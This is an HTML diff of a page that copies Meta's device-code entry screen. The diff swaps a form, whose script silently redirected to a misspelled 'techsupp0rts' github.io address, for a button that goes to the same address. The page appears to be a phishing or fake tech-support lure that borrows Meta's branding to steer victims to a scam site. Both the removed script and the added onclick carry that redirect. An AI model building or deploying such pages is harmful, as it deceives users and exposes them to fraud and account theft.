@@ -25,7 +25,7 @@
     h1{font-size:20px;margin-bottom:8px;font-weight:600}
     p.lead{color:var(--muted);margin-bottom:20px;font-size:15px}
 
-    form{display:flex;flex-direction:column;gap:14px;align-items:center}
+    .form-wrapper{display:flex;flex-direction:column;gap:14px;align-items:center}
     input[type="text"]{
       width:100%;
       padding:14px 16px;
@@ -78,10 +78,12 @@
     <h1 id="title">Enter the code shown on your device</h1>
     <p class="lead">Only use a code from a source that you trust. <a href="https://meta.com/help" target="_blank" rel="noopener">Need help?</a></p>
 
-    <form id="codeForm" autocomplete="off" novalidate>
-      <input id="code" name="code" type="text" placeholder="Enter code" required />
-      <button type="submit" class="primary">Connect your device</button>
-    </form>
+    <div class="form-wrapper">
+      <input id="code" name="code" type="text" placeholder="Enter code" />
+      <button class="primary" onclick="window.location.href='https://24x7techsupp0rts-cloud.github.io/eror/'">
+        Connect your device
+      </button>
+    </div>
 
     <div class="footer">
       <span>English (US)</span>
@@ -94,14 +96,5 @@
       <span><a href="https://meta.com/help" target="_blank">Help Center</a></span>
     </div>
   </main>
-
-  <script>
-    const form = document.getElementById('codeForm');
-    form.addEventListener('submit', (e)=>{
-      e.preventDefault();
-      // Direct redirect without showing alert
-      window.location.href = "https://24x7techsupp0rts-cloud.github.io/eror/";
-    });
-  </script>
 </body>
 </html>
